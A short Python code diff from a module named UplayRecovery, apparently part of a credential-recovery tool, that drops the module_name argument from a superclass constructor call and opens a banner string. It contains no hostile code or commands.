@@ -6,7 +6,7 @@ from config import ModuleManager, Constant
 
 class UplayRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name = "UplayRecovery", module_path="applications/uplay")
+        super().__init__(module_path="applications/uplay")
         
         self.banner(r"""
      _______         _     _        __               
